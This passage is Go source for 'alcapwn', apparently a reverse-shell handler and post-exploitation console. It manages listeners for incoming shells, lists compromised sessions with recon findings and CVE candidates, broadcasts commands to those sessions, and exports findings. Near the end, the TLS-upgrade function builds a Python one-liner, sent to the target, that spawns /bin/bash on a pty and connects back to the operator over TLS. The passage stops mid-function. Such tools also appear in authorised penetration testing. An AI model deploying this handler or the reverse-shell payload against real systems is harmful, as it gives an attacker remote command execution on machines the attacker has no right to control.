package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/sys/unix"
	"golang.org/x/term"
)

// ── consolePrinter ────────────────────────────────────────────────────────────

// consolePrinter provides thread-safe terminal notifications that preserve the
// operator prompt line.  Multiple accept-loop / recon goroutines call Notify()
// concurrently; the mutex ensures output is never interleaved.
type consolePrinter struct {
	mu      sync.Mutex
	console *Console
}

// Notify clears the current line, prints the message, then reprints the prompt.
func (p *consolePrinter) Notify(format string, args ...interface{}) {
	p.mu.Lock()
	defer p.mu.Unlock()
	fmt.Print("\r\x1b[2K") // return to column 0, erase line
	fmt.Printf(format+"\n", args...)
	p.console.editor.redrawLine(p.console.currentPrompt())
}

// ── listenerRegistry ─────────────────────────────────────────────────────────

type listenerEntry struct {
	ln           net.Listener
	addr         string
	sessionCount int32 // updated atomically
}

type listenerRegistry struct {
	mu        sync.Mutex
	listeners map[string]*listenerEntry
}

func newListenerRegistry() *listenerRegistry {
	return &listenerRegistry{listeners: make(map[string]*listenerEntry)}
}

func (lr *listenerRegistry) add(addr string, e *listenerEntry) bool {
	lr.mu.Lock()
	defer lr.mu.Unlock()
	if _, exists := lr.listeners[addr]; exists {
		return false
	}
	lr.listeners[addr] = e
	return true
}

func (lr *listenerRegistry) remove(addr string) *listenerEntry {
	lr.mu.Lock()
	defer lr.mu.Unlock()
	e := lr.listeners[addr]
	delete(lr.listeners, addr)
	return e
}

func (lr *listenerRegistry) all() []*listenerEntry {
	lr.mu.Lock()
	defer lr.mu.Unlock()
	result := make([]*listenerEntry, 0, len(lr.listeners))
	for _, e := range lr.listeners {
		result = append(result, e)
	}
	sort.Slice(result, func(i, j int) bool { return result[i].addr < result[j].addr })
	return result
}

// findByPort matches a listener by port number or full address string.
func (lr *listenerRegistry) findByPort(query string) *listenerEntry {
	lr.mu.Lock()
	defer lr.mu.Unlock()
	for addr, e := range lr.listeners {
		if addr == query {
			return e
		}
		_, p, err := net.SplitHostPort(addr)
		if err == nil && p == query {
			return e
		}
	}
	return nil
}

// ── consoleState ──────────────────────────────────────────────────────────────

type consoleState struct {
	mu              sync.Mutex
	activeSessionID int
	backgroundCh    chan struct{} // non-nil while in interactWithSession
}

// ── terminal input helpers ────────────────────────────────────────────────────

// makeInputRaw transitions fd to "input-raw" mode: character-by-character
// reads, echo off, ISIG off — but output post-processing (OPOST/ONLCR) is
// intentionally left enabled so \n still produces CRLF.
//
// term.MakeRaw also clears OPOST, which breaks every goroutine that writes a
// bare \n (spinner, consolePrinter.Notify, etc.) because those \n bytes are
// no longer translated to \r\n by the kernel, causing lines to stack up at
// their starting column instead of returning to column 0.
//
// Returns a restore func that resets the terminal to its prior state.
func makeInputRaw(fd int) (restore func(), err error) {
	termios, err := unix.IoctlGetTermios(fd, unix.TCGETS)
	if err != nil {
		return func() {}, err
	}
	saved := *termios

	// Same flags as term.MakeRaw — except we do NOT touch Oflag so OPOST/ONLCR
	// stay on and every goroutine's \n continues to produce \r\n.
	termios.Iflag &^= unix.IGNBRK | unix.BRKINT | unix.PARMRK | unix.ISTRIP |
		unix.INLCR | unix.IGNCR | unix.ICRNL | unix.IXON
	// Oflag: intentionally unchanged — keep OPOST + ONLCR.
	termios.Lflag &^= unix.ECHO | unix.ECHONL | unix.ICANON | unix.ISIG | unix.IEXTEN
	termios.Cflag &^= unix.CSIZE | unix.PARENB
	termios.Cflag |= unix.CS8
	termios.Cc[unix.VMIN] = 1
	termios.Cc[unix.VTIME] = 0

	if err := unix.IoctlSetTermios(fd, unix.TCSETS, termios); err != nil {
		return func() {}, err
	}
	return func() {
		unix.IoctlSetTermios(fd, unix.TCSETS, &saved) //nolint:errcheck
	}, nil
}

// ── lineEditor ────────────────────────────────────────────────────────────────

// lineEditor provides arrow-key navigation and command history at the operator
// prompt by putting the terminal in raw mode during input so escape sequences
// are delivered as byte sequences instead of being processed by the OS line
// discipline.
type lineEditor struct {
	mu      sync.Mutex
	buf     []rune   // current input line
	pos     int      // cursor position within buf
	history []string // submitted command history
	histIdx int      // index into history (len == "none selected")
	active  bool     // true while readLine is blocking for input
	prompt  string   // prompt string, for redraws triggered by Notify
	fd      int      // terminal fd for raw-mode operations
}

func newLineEditor(fd int) *lineEditor {
	return &lineEditor{fd: fd}
}

// isActive returns true while readLine is blocking for input in raw mode.
func (e *lineEditor) isActive() bool {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.active
}

// redrawLine repaints the prompt and in-progress input after a notification
// scrolls across the terminal.  Called inside consolePrinter.Notify (with
// consolePrinter.mu held).  When not actively reading, it prints the fallback
// prompt (same as the previous Notify behaviour).
func (e *lineEditor) redrawLine(fallback string) {
	e.mu.Lock()
	active := e.active
	prompt := e.prompt
	buf := make([]rune, len(e.buf))
	copy(buf, e.buf)
	pos := e.pos
	e.mu.Unlock()

	if active {
		line := string(buf)
		fmt.Printf("%s%s", prompt, line)
		if pos < len(buf) {
			fmt.Printf("\x1b[%dD", len(buf)-pos)
		}
	} else {
		fmt.Print(fallback)
	}
}

// readLine reads a single line with raw-mode arrow-key and history support.
// Returns ("", nil) on Ctrl+C; ("", io.EOF) on Ctrl+D with an empty buffer.
func (e *lineEditor) readLine(prompt string) (string, error) {
	restore, rawErr := makeInputRaw(e.fd)
	if rawErr != nil {
		// Not a TTY (piped input) — fall back to simple line reading.
		reader := bufio.NewReader(os.Stdin)
		fmt.Print(prompt)
		line, readErr := reader.ReadString('\n')
		return strings.TrimRight(line, "\r\n"), readErr
	}
	defer restore()

	e.mu.Lock()
	e.buf = e.buf[:0]
	e.pos = 0
	e.histIdx = len(e.history)
	e.prompt = prompt
	e.active = true
	e.mu.Unlock()

	defer func() {
		e.mu.Lock()
		e.active = false
		e.mu.Unlock()
	}()

	fmt.Print(prompt)

	var tempLine string // stash of current edits when navigating history

	for {
		var b [1]byte
		if _, err := os.Stdin.Read(b[:]); err != nil {
			return "", err
		}

		switch b[0] {
		case '\r', '\n': // Enter — submit
			e.mu.Lock()
			line := string(e.buf)
			if line != "" {
				if len(e.history) == 0 || e.history[len(e.history)-1] != line {
					e.history = append(e.history, line)
				}
				e.histIdx = len(e.history)
			}
			e.mu.Unlock()
			fmt.Print("\r\n")
			return line, nil

		case 0x7f, 0x08: // Backspace / DEL
			e.mu.Lock()
			if e.pos > 0 {
				e.buf = append(e.buf[:e.pos-1], e.buf[e.pos:]...)
				e.pos--
				line, curPos, bufLen := string(e.buf), e.pos, len(e.buf)
				e.mu.Unlock()
				fmt.Printf("\r\x1b[2K%s%s", prompt, line)
				if curPos < bufLen {
					fmt.Printf("\x1b[%dD", bufLen-curPos)
				}
			} else {
				e.mu.Unlock()
			}

		case 0x01: // Ctrl+A — beginning of line
			e.mu.Lock()
			if e.pos > 0 {
				curPos := e.pos
				e.pos = 0
				e.mu.Unlock()
				fmt.Printf("\x1b[%dD", curPos)
			} else {
				e.mu.Unlock()
			}

		case 0x05: // Ctrl+E — end of line
			e.mu.Lock()
			if e.pos < len(e.buf) {
				diff := len(e.buf) - e.pos
				e.pos = len(e.buf)
				e.mu.Unlock()
				fmt.Printf("\x1b[%dC", diff)
			} else {
				e.mu.Unlock()
			}

		case 0x0b: // Ctrl+K — kill to end of line
			e.mu.Lock()
			if e.pos < len(e.buf) {
				e.buf = e.buf[:e.pos]
				e.mu.Unlock()
				fmt.Print("\x1b[K") // erase from cursor to end of line
			} else {
				e.mu.Unlock()
			}

		case 0x03: // Ctrl+C — cancel input, re-prompt
			e.mu.Lock()
			e.buf = e.buf[:0]
			e.pos = 0
			e.mu.Unlock()
			fmt.Print("^C\r\n")
			return "", nil

		case 0x04: // Ctrl+D — EOF on empty line
			e.mu.Lock()
			empty := len(e.buf) == 0
			e.mu.Unlock()
			if empty {
				fmt.Print("\r\n")
				return "", io.EOF
			}

		case 0x1b: // Escape sequence
			var seq [2]byte
			n1, _ := os.Stdin.Read(seq[:1])
			if n1 == 0 || seq[0] != '[' {
				break
			}
			n2, _ := os.Stdin.Read(seq[1:2])
			if n2 == 0 {
				break
			}
			switch seq[1] {
			case 'A': // Up — previous history entry
				e.mu.Lock()
				if e.histIdx > 0 {
					if e.histIdx == len(e.history) {
						tempLine = string(e.buf)
					}
					e.histIdx--
					e.buf = []rune(e.history[e.histIdx])
					e.pos = len(e.buf)
					line := string(e.buf)
					e.mu.Unlock()
					fmt.Printf("\r\x1b[2K%s%s", prompt, line)
				} else {
					e.mu.Unlock()
				}

			case 'B': // Down — next history entry
				e.mu.Lock()
				if e.histIdx < len(e.history) {
					e.histIdx++
					if e.histIdx == len(e.history) {
						e.buf = []rune(tempLine)
					} else {
						e.buf = []rune(e.history[e.histIdx])
					}
					e.pos = len(e.buf)
					line := string(e.buf)
					e.mu.Unlock()
					fmt.Printf("\r\x1b[2K%s%s", prompt, line)
				} else {
					e.mu.Unlock()
				}

			case 'C': // Right — move cursor forward
				e.mu.Lock()
				if e.pos < len(e.buf) {
					e.pos++
					e.mu.Unlock()
					fmt.Print("\x1b[C")
				} else {
					e.mu.Unlock()
				}

			case 'D': // Left — move cursor back
				e.mu.Lock()
				if e.pos > 0 {
					e.pos--
					e.mu.Unlock()
					fmt.Print("\x1b[D")
				} else {
					e.mu.Unlock()
				}

			case 'H': // Home
				e.mu.Lock()
				if e.pos > 0 {
					curPos := e.pos
					e.pos = 0
					e.mu.Unlock()
					fmt.Printf("\x1b[%dD", curPos)
				} else {
					e.mu.Unlock()
				}

			case 'F': // End
				e.mu.Lock()
				if e.pos < len(e.buf) {
					diff := len(e.buf) - e.pos
					e.pos = len(e.buf)
					e.mu.Unlock()
					fmt.Printf("\x1b[%dC", diff)
				} else {
					e.mu.Unlock()
				}

			case '3': // ESC [ 3 → Delete key (ESC [ 3 ~)
				var extra [1]byte
				if n, _ := os.Stdin.Read(extra[:]); n > 0 && extra[0] == '~' {
					e.mu.Lock()
					if e.pos < len(e.buf) {
						e.buf = append(e.buf[:e.pos], e.buf[e.pos+1:]...)
						line, curPos, bufLen := string(e.buf), e.pos, len(e.buf)
						e.mu.Unlock()
						fmt.Printf("\r\x1b[2K%s%s", prompt, line)
						if curPos < bufLen {
							fmt.Printf("\x1b[%dD", bufLen-curPos)
						}
					} else {
						e.mu.Unlock()
					}
				}
			}

		default:
			if b[0] >= 0x20 { // Printable ASCII
				r := rune(b[0])
				e.mu.Lock()
				// Insert rune at cursor position.
				e.buf = append(e.buf, 0)
				copy(e.buf[e.pos+1:], e.buf[e.pos:])
				e.buf[e.pos] = r
				e.pos++
				line, curPos, bufLen := string(e.buf), e.pos, len(e.buf)
				e.mu.Unlock()
				if curPos == bufLen {
					// At end of line — just echo the character.
					fmt.Printf("%c", r)
				} else {
					// Inserting in the middle — redraw and reposition.
					fmt.Printf("\r\x1b[2K%s%s\x1b[%dD", prompt, line, bufLen-curPos)
				}
			}
		}
	}
}

// ── Console ───────────────────────────────────────────────────────────────────

// Console is the operator shell.  It owns the listener registry and dispatches
// all interactive commands.
type Console struct {
	registry  *Registry
	listeners *listenerRegistry
	opts      sessionOpts
	printer   *consolePrinter
	state     consoleState
	editor    *lineEditor

	// pendingTLSUpgrade maps source IP → channel for in-flight manual TLS
	// upgrades.  acceptLoop checks this before allocating a new session so the
	// reconnecting connection is handed directly to cmdTLSUpgrade's goroutine
	// instead of creating an unwanted new session.
	pendingTLSMu      sync.Mutex
	pendingTLSUpgrade map[string]chan net.Conn
}

// NewConsole creates a Console bound to the given registry and base opts.
func NewConsole(registry *Registry, opts sessionOpts) *Console {
	c := &Console{
		registry:          registry,
		listeners:         newListenerRegistry(),
		opts:              opts,
		pendingTLSUpgrade: make(map[string]chan net.Conn),
		editor:            newLineEditor(int(os.Stdin.Fd())),
	}
	c.printer = &consolePrinter{console: c}
	return c
}

// currentPrompt returns the prompt string appropriate for the current state.
func (c *Console) currentPrompt() string {
	c.state.mu.Lock()
	defer c.state.mu.Unlock()
	if c.state.activeSessionID != 0 {
		return fmt.Sprintf("alcapwn [%d]> ", c.state.activeSessionID)
	}
	return "alcapwn> "
}

// registerTLSWaiter inserts origIP into the pendingTLSUpgrade routing table
// and returns the delivery channel plus a cleanup function.  The caller MUST
// register before sending the reconnect command so that acceptLoop can route
// the incoming connection correctly even if Python connects back immediately.
//
//	ch, cancel := c.registerTLSWaiter(origIP)
//	defer cancel()
//	sendReconnectCommand(...)
//	select { case raw := <-ch: ... case <-time.After(timeout): ... }
func (c *Console) registerTLSWaiter(origIP string) (<-chan net.Conn, func()) {
	ch := make(chan net.Conn, 1)
	c.pendingTLSMu.Lock()
	c.pendingTLSUpgrade[origIP] = ch
	c.pendingTLSMu.Unlock()
	cancel := func() {
		c.pendingTLSMu.Lock()
		delete(c.pendingTLSUpgrade, origIP)
		c.pendingTLSMu.Unlock()
	}
	return ch, cancel
}

// StartListener starts a TCP listener on addr and registers it.
// Called from main() for the -l flag, and from the 'listen' command.
func (c *Console) StartListener(addr string) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Failed to listen on %s: %v\n", addr, err)
		return
	}
	entry := &listenerEntry{ln: ln, addr: addr}
	if !c.listeners.add(addr, entry) {
		ln.Close()
		fmt.Printf("[!] Already listening on %s\n", addr)
		return
	}
	fmt.Printf("[*] Listener started on %s\n", addr)
	go c.acceptLoop(ln, entry)
}

// acceptLoop calls ln.Accept() in a loop, allocates sessions, and spawns
// handleSession goroutines.
func (c *Console) acceptLoop(ln net.Listener, entry *listenerEntry) {
	_, portStr, _ := net.SplitHostPort(entry.addr)
	listenPort := 4444
	if p, err := strconv.Atoi(portStr); err == nil {
		listenPort = p
	}
	listenIP, _, _ := net.SplitHostPort(entry.addr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			// Deadline timeouts are transient — keep looping.
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			return
		}

		// If a manual 'tls <id>' upgrade is in flight for this source IP, hand
		// the raw connection directly to its goroutine instead of creating a new
		// session.  The goroutine does its own TLS peek + handshake.
		srcIP := hostFromAddr(conn.RemoteAddr())
		c.pendingTLSMu.Lock()
		upgradeCh := c.pendingTLSUpgrade[srcIP]
		c.pendingTLSMu.Unlock()
		if upgradeCh != nil {
			select {
			case upgradeCh <- conn:
				continue // owned by cmdTLSUpgrade goroutine; skip normal path
			default:
				// Upgrade timed out; fall through to normal session handling.
			}
		}

		var finalConn net.Conn = conn
		isTLS := false

		if c.opts.tlsEnabled && c.opts.tlsCfg != nil {
			buf := make([]byte, 1)
			conn.Read(buf) //nolint:errcheck
			if buf[0] == 0x16 {
				tlsConn := tls.Server(&prefixConn{Conn: conn, prefix: buf}, c.opts.tlsCfg)
				if err := tlsConn.Handshake(); err != nil {
					conn.Close()
					c.printer.Notify("[!] TLS handshake failed from %s: %v", conn.RemoteAddr(), err)
					continue
				}
				finalConn = tlsConn
				isTLS = true
			} else {
				finalConn = &prefixConn{Conn: conn, prefix: buf}
			}
		}

		sess := c.registry.Allocate(finalConn, isTLS)
		if sess == nil {
			finalConn.Close()
			continue
		}
		sess.ListenerAddr = entry.addr

		atomic.AddInt32(&entry.sessionCount, 1)
		c.printer.Notify("[+] Session [%d] opened — %s", sess.ID, finalConn.RemoteAddr())

		sessOpts := c.opts
		sessOpts.printer = c.printer
		sessOpts.registry = c.registry
		sessOpts.listenIP = listenIP
		sessOpts.listenPort = listenPort
		sessOpts.registerTLSWaiter = c.registerTLSWaiter

		go func(s *Session, o sessionOpts, e *listenerEntry) {
			handleSession(s, o)
			atomic.AddInt32(&e.sessionCount, -1)
		}(sess, sessOpts, entry)
	}
}

// ── Run ───────────────────────────────────────────────────────────────────────

// Run is the main operator shell loop.  It blocks until 'exit' is confirmed.
func (c *Console) Run() {
	// Install signal handlers.
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go c.handleSignals(sigCh)

	for {
		line, err := c.editor.readLine(c.currentPrompt())
		if err == io.EOF {
			// Ctrl+D on empty line — treat as exit.
			c.doExit()
			return
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		fields := strings.Fields(line)
		verb := fields[0]
		args := fields[1:]

		switch verb {
		case "listen":
			c.cmdListen(args)
		case "listeners":
			c.cmdListeners()
		case "unlisten":
			c.cmdUnlisten(args)
		case "sessions":
			c.cmdSessions()
		case "use":
			c.cmdUse(args)
		case "kill":
			c.cmdKill(args)
		case "info":
			c.cmdInfo(args)
		case "export":
			c.cmdExport(args)
		case "broadcast":
			c.cmdBroadcast(args)
		case "rename":
			c.cmdRename(args)
		case "tls":
			c.cmdTLSUpgrade(args)
		case "fp", "fingerprint":
			c.cmdFingerprint(args)
		case "reset":
			c.cmdReset(args)
		case "exit", "quit":
			if c.doExit() {
				return
			}
		case "help", "?":
			c.cmdHelp()
		default:
			fmt.Printf("[!] Unknown command: %s. Type 'help' for list.\n", verb)
		}
	}
}

// handleSignals processes OS signals in a background goroutine.
func (c *Console) handleSignals(ch <-chan os.Signal) {
	for sig := range ch {
		switch sig {
		case syscall.SIGINT:
			c.state.mu.Lock()
			inSession := c.state.activeSessionID != 0
			bgCh := c.state.backgroundCh
			c.state.mu.Unlock()

			if inSession && bgCh != nil {
				// Signal the interactive loop to background.
				select {
				case bgCh <- struct{}{}:
				default:
				}
			} else if !c.editor.isActive() {
				// At operator prompt between readLine calls — show ^C.
				// When readLine is active, it handles Ctrl+C via the 0x03 byte
				// directly (ISIG is disabled in raw mode, so SIGINT is not
				// generated; this branch is for the non-TTY / piped fallback).
				fmt.Print("\n^C\n")
			}

		case syscall.SIGTERM:
			fmt.Println("\n[!] SIGTERM received — shutting down...")
			c.cleanShutdown()
			os.Exit(0)
		}
	}
}

// ── Command implementations ───────────────────────────────────────────────────

func (c *Console) cmdListen(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: listen <host:port>")
		return
	}
	addr := args[0]
	if _, _, err := net.SplitHostPort(addr); err != nil {
		fmt.Printf("[!] Invalid address %q: %v\n", addr, err)
		return
	}
	c.StartListener(addr)
}

func (c *Console) cmdListeners() {
	entries := c.listeners.all()
	if len(entries) == 0 {
		fmt.Println("[*] No active listeners.")
		return
	}
	fmt.Printf("  %-22s  %s\n", "Address", "Sessions")
	fmt.Printf("  %-22s  %s\n", strings.Repeat("─", 22), strings.Repeat("─", 8))
	for _, e := range entries {
		n := int(atomic.LoadInt32(&e.sessionCount))
		noun := "sessions"
		if n == 1 {
			noun = "session"
		}
		fmt.Printf("  %-22s  %d %s\n", e.addr, n, noun)
	}
}

func (c *Console) cmdUnlisten(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: unlisten <port|host:port>")
		return
	}
	query := args[0]
	entry := c.listeners.findByPort(query)
	if entry == nil {
		// Try exact remove first.
		entry = c.listeners.remove(query)
	} else {
		c.listeners.remove(entry.addr)
	}
	if entry == nil {
		fmt.Printf("[!] No listener matching %q\n", query)
		return
	}
	entry.ln.Close()
	fmt.Printf("[*] Listener on %s closed.\n", entry.addr)
}

func (c *Console) cmdSessions() {
	sessions := c.registry.All()
	if len(sessions) == 0 {
		fmt.Println("[*] No active sessions.")
		return
	}

	fmt.Printf("  %-4s  %-20s  %-12s  %-24s  %-4s  %-3s  %s\n",
		"ID", "Remote", "User", "OS", "CVEs", "TLS", "Age")
	fmt.Printf("  %-4s  %-20s  %-12s  %-24s  %-4s  %-3s  %s\n",
		"──", "────────────────────", "────────────", "────────────────────────", "────", "───", "───")

	for _, s := range sessions {
		s.mu.Lock()
		age := fmtAge(time.Since(s.StartTime))
		tlsStr := "✗"
		if s.TLS {
			tlsStr = "✓"
		}

		var user, osStr, cveStr string
		suffix := ""

		if s.Findings == nil {
			user = "..."
			osStr = "..."
			cveStr = "..."
			suffix = "  ← recon running"
		} else {
			if s.Findings.User != nil {
				user = *s.Findings.User
			} else {
				user = "unknown"
			}
			if s.Findings.OS != nil {
				osStr = *s.Findings.OS
			} else {
				osStr = "unknown"
			}
			cveStr = strconv.Itoa(len(s.Findings.CveCandidates))
		}

		// Truncate long fields for display.
		user = truncate(user, 12)
		osStr = truncate(osStr, 24)

		// Show label when set, otherwise strip port from remote addr.
		remote := s.RemoteAddr
		if h, _, err := net.SplitHostPort(remote); err == nil {
			remote = h
		}
		if s.Label != "" {
			remote = s.Label
		}
		remote = truncate(remote, 20)

		s.mu.Unlock()

		fmt.Printf("  %-4d  %-20s  %-12s  %-24s  %-4s  %-3s  %s%s\n",
			s.ID, remote, user, osStr, cveStr, tlsStr, age, suffix)
	}
}

func (c *Console) cmdUse(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: use <id>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	if sess.State == SessionStateInteractive {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is already active.\n", id)
		return
	}
	if sess.State == SessionStateTerminated {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d has been terminated.\n", id)
		return
	}
	if sess.Upgrader == nil {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
		return
	}
	sess.State = SessionStateInteractive
	sess.mu.Unlock()

	c.state.mu.Lock()
	c.state.activeSessionID = id
	c.state.mu.Unlock()

	c.interactWithSession(sess)

	c.state.mu.Lock()
	c.state.activeSessionID = 0
	c.state.mu.Unlock()
}

func (c *Console) cmdKill(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: kill <id>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	conn := sess.ActiveConn
	plain := sess.Conn
	sess.mu.Unlock()

	if conn == nil {
		conn = plain
	}
	if conn != nil {
		killRemoteProcessGroup(conn)
		conn.Close()
	}
	if plain != nil && plain != conn {
		plain.Close()
	}

	c.registry.Remove(id)
	fmt.Printf("[*] Session %d terminated.\n", id)
}

func (c *Console) cmdInfo(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: info <id>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	findings := sess.Findings
	matches := sess.Matches
	sess.mu.Unlock()

	if findings == nil {
		fmt.Printf("[!] Recon still running for session %d.\n", id)
		return
	}
	printSummary(findings, matches)
}

func (c *Console) cmdExport(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: export <id> [path]")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	findings := sess.Findings
	remote := sess.RemoteAddr
	label := sess.Label
	sess.mu.Unlock()

	if findings == nil {
		fmt.Printf("[!] Recon still running for session %d — no findings to export yet.\n", id)
		return
	}

	var outPath string
	if len(args) >= 2 {
		outPath = args[1]
	} else {
		var host string
		if label != "" {
			host = label
		} else {
			host = remote
			if h, _, splitErr := net.SplitHostPort(remote); splitErr == nil {
				host = h
			}
			host = sanitizeLabel(strings.ReplaceAll(host, ".", "_"))
		}
		ts := time.Now().Format("20060102_150405")
		dir := c.opts.findingsDir
		if dir == "" {
			dir = "."
		}
		if err := os.MkdirAll(dir, 0700); err != nil {
			fmt.Printf("[!] Could not create directory: %v\n", err)
			return
		}
		outPath = filepath.Join(dir, fmt.Sprintf("findings_%s_%s.json", host, ts))
	}

	data, err := json.MarshalIndent(findings, "", "  ")
	if err != nil {
		fmt.Printf("[!] Marshal error: %v\n", err)
		return
	}
	if err := os.WriteFile(outPath, data, 0600); err != nil {
		fmt.Printf("[!] Write error: %v\n", err)
		return
	}
	fmt.Printf("[*] Exported to %s\n", outPath)
}

func (c *Console) cmdBroadcast(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: broadcast <cmd>")
		return
	}
	cmd := strings.Join(args, " ") + "\n"
	sessions := c.registry.All()
	count := 0
	skipped := 0
	for _, s := range sessions {
		s.mu.Lock()
		state := s.State
		conn := s.ActiveConn
		if conn == nil {
			conn = s.Conn
		}
		s.mu.Unlock()
		if state == SessionStateInteractive {
			skipped++
			continue
		}
		if conn != nil {
			conn.Write([]byte(cmd)) //nolint:errcheck
			count++
		}
	}
	if skipped > 0 {
		fmt.Printf("[*] Broadcast to %d session(s) (%d interactive skipped).\n", count, skipped)
	} else {
		fmt.Printf("[*] Broadcast to %d session(s).\n", count)
	}
}

// cmdTLSUpgrade upgrades a plain session to TLS.
//
// The reconnecting connection is claimed via pendingTLSUpgrade so acceptLoop
// never creates a spurious second session.  The command returns immediately
// after sending the reconnect; a background goroutine waits for the connection,
// performs the TLS handshake, and updates the session in-place.
//
// Downgrade (TLS → plain) is not supported: the Python relay has no revert
// mechanism and weakening encryption mid-session has no legitimate purpose.
func (c *Console) cmdTLSUpgrade(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: tls <id>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}

	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	state := sess.State
	alreadyTLS := sess.TLS
	upgrader := sess.Upgrader
	listenerAddr := sess.ListenerAddr
	plainConn := sess.Conn
	sess.mu.Unlock()

	if alreadyTLS {
		if c.opts.tlsEnabled {
			fmt.Printf("[!] Session %d is already encrypted — alcapwn was started with --tls, TLS is mandatory on compatible sessions.\n", id)
		} else {
			fmt.Printf("[!] Session %d is already encrypted. Downgrade is not supported.\n", id)
		}
		return
	}
	if state == SessionStateInteractive {
		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
		return
	}
	if state == SessionStateTerminated {
		fmt.Printf("[!] Session %d has been terminated.\n", id)
		return
	}
	if upgrader == nil {
		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
		return
	}

	// Lazily generate an ephemeral TLS cert if --tls wasn't set at startup.
	if c.opts.tlsCfg == nil {
		if c.opts.verbosity >= 1 {
			fmt.Println("[*] Generating ephemeral TLS certificate...")
		}
		tlsCfg, fp, genErr := generateEphemeralTLSConfig()
		if genErr != nil {
			fmt.Printf("[!] Failed to generate TLS certificate: %v\n", genErr)
			return
		}
		c.opts.tlsCfg = tlsCfg
		c.opts.fingerprint = fp
		c.opts.fingerprintHex = strings.ToLower(strings.ReplaceAll(fp, ":", ""))
		if c.opts.verbosity >= 1 {
			fmt.Printf("[*] Ephemeral cert fingerprint: %s\n", fp)
		}
	}

	// Stop any drain goroutine before we read/write plainConn for detection and
	// the reconnect command.  The drain goroutine competes with upgrader.reader
	// on the same socket — if it steals the ALCAPWN_PYEND sentinel bytes,
	// detectPythonBin will time out and the upgrade silently fails.
	c.stopDrain(sess)

	// Python is needed on the remote to run the TLS relay.  detectPythonBin()
	// skips detection when tlsMode was false at session-open time, so call it
	// explicitly here.
	if !upgrader.usedPython {
		if c.opts.verbosity >= 1 {
			fmt.Printf("[*] Detecting Python on session %d...\n", id)
		}
		// Give the shell a moment to settle before sending the Python check command
		time.Sleep(200 * time.Millisecond)
		upgrader.detectPythonBin()
		if !upgrader.usedPython {
			fmt.Printf("[!] No Python available on session %d — cannot upgrade to TLS.\n", id)
			return
		}
	}

	// Require an active listener for the target to reconnect to.
	if c.listeners.findByPort(listenerAddr) == nil {
		fmt.Printf("[!] Listener %s is no longer active — restart it and retry.\n", listenerAddr)
		return
	}

	effectiveListenIP := strings.Trim(hostFromAddr(plainConn.LocalAddr()), "[]")
	if effectiveListenIP == "" {
		effectiveListenIP, _, _ = net.SplitHostPort(listenerAddr)
	}
	_, portStr, _ := net.SplitHostPort(listenerAddr)
	listenPort := 4444
	if p, convErr := strconv.Atoi(portStr); convErr == nil {
		listenPort = p
	}

	reconnectCmd := fmt.Sprintf(
		`%s -c "import socket,ssl,os,pty,threading,hashlib,subprocess as sp;m,sv=pty.openpty();p=sp.Popen(['/bin/bash'],stdin=sv,stdout=sv,stderr=sv,start_new_session=True,close_fds=True,pass_fds=[m]);os.close(sv);ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT);ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;t=ctx.wrap_socket(socket.create_connection(('%s',%d),timeout=10));assert hashlib.sha256(t.getpeercert(binary_form=True)).hexdigest()=='%s';exec('def rd():\n try:\n  while 1:\n   d=t.read(4096)\n   if d:os.write(m,d)\n   else:break\n except:pass\nthreading.Thread(target=rd,daemon=True).start()\ntry:\n while 1:\n  d=os.read(m,4096)\n  t.write(d)\nexcept:pass')"`,
		upgrader.pythonBin, effectiveListenIP, listenPort, c.opts.fingerprintHex,
	)

	// Register the routing claim BEFORE sending the command so acceptLoop
	// never races to accept the reconnect as a new session.
	origIP := hostFromAddr(plainConn.RemoteAddr())
	upgradeCh := make(chan net.Conn, 1)
	c.pendingTLSMu.Lock()
